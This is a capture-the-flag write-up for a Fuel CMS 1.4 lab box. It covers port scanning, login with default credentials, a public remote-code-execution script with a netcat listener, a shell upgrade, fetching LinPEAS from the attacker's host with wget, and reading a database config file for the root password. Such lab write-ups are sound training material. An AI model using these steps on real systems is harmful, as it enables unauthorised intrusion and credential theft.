# Enumeration
Let's use rustscan to quickly identify open ports.

![4774bf8379e59bbd52afeb6ee5ce35c8.png](./_resources/4774bf8379e59bbd52afeb6ee5ce35c8.png)

We'll confirm with nmap.

![483d18860073c5d5c096da2d715c1d4b.png](./_resources/483d18860073c5d5c096da2d715c1d4b.png)

![ce5189b40e37a4e8319174e75e5fccaf.png](./_resources/ce5189b40e37a4e8319174e75e5fccaf.png)

Now let's take a look at the web server. We see that it is running version 1.4 of the Fuel CMS, and the default credentials are provided if we scroll down.

![8cbca008e4bf56d6151b9e1a4e4472be.png](./_resources/8cbca008e4bf56d6151b9e1a4e4472be.png)

![05c5fe7e77fd22d091419dfd93f1b88e.png](./_resources/05c5fe7e77fd22d091419dfd93f1b88e.png)

Navigating to the `/fuel` directory, we find a login page.

![5224dac9506318c33577a2a6348acfce.png](./_resources/5224dac9506318c33577a2a6348acfce.png)

Luckily, the default credentials still work.

![a07ec25b29efb52af9f57633a28229cd.png](./_resources/a07ec25b29efb52af9f57633a28229cd.png)
<br>

# Exploitation
Googling "Fuel CMS 1.4 exploit" reveals a few possibilities. We will make use of [this exploit](https://github.com/AssassinUKG/fuleCMS). First set up a netcat listener. Then, download the python script and run it with `python3 fuelCMS.py <target IP>`.

![824c410c47e432324c70f32bfaf55b5f.png](./_resources/824c410c47e432324c70f32bfaf55b5f.png)

![54d72e75264d6394a8b3a9d06033e676.png](./_resources/54d72e75264d6394a8b3a9d06033e676.png)

Just like that, we have an initial foothold. Let's upgrade our shell with `import pty;pty.spawn("/bin/bash")`. From here, we can easily find the `user.txt` flag in our current user's home directory.

![6c79a56310480b8d75c813d6db224039.png](./_resources/6c79a56310480b8d75c813d6db224039.png)
<br>

# Post-Exploitation
Let's use [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) to search for possible privilege escalation methods on the target machine. Download the linpeas.sh file onto the attacking machine, spin up a webserver with `python3 -m http.server`, and download it onto the target machine using `wget <attacking IP>:8000/linpeas.sh`.

![9299f7445bd2df16067f66c6d071f90e.png](./_resources/9299f7445bd2df16067f66c6d071f90e.png)

Here I saved the file to the `/tmp` directory so that I don't have to worry about write permissions. Now use `chmod +x linpeas.sh` to mark the file as executable, then run it with `./linpeas.sh`.  We find a possible password in a database backup file:

![9a20046c446b84527afff7846355453a.png](./_resources/9a20046c446b84527afff7846355453a.png)

Since we have read permissions for the database file, we can check this for ourselves by using `cat /var/www/html/fuel/application/config/database.php`.

![67365bf12d04ba323672011be459f367.png](./_resources/67365bf12d04ba323672011be459f367.png)

Notice that this ties the root user to the password we found! If we use `su root` and we input the password we found, we see that this is indeed the case. Finally, we find the `root.txt` flag in the root user's home directory.

![6fac5bc79856190b4c07d1256c5a660e.png](./_resources/6fac5bc79856190b4c07d1256c5a660e.png)